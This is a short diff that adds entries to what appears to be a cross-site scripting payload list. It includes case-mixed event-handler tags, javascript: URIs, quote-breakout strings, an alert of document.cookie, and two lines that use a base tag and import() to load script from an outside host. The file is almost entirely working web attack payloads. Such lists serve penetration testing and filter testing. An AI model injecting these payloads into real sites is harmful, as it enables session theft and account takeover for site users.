@@ -13,3 +13,13 @@ this.ownerDocument.defaultView['\u0061lert'](4)
 confirm?.(1)
 <img src=”invalid-image” onerror=”alert(document.cookie)”>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<Base Href=//X55.is>
+<K OnPointerRawUpdate=alert(1)>
+ \’/alert(1)//
+JavaScript:alert(1)
+ ‘-alert(1)-’
+<Script>alert(1)</Script>
+<K ContentEditable AutoFocus OnFocus=alert(1)>
+“AutoFocus OnFocus=alert(1)//
+<Svg OnLoad=alert(1)>
+<Img Src=//X55.is OnLoad=import(src)>
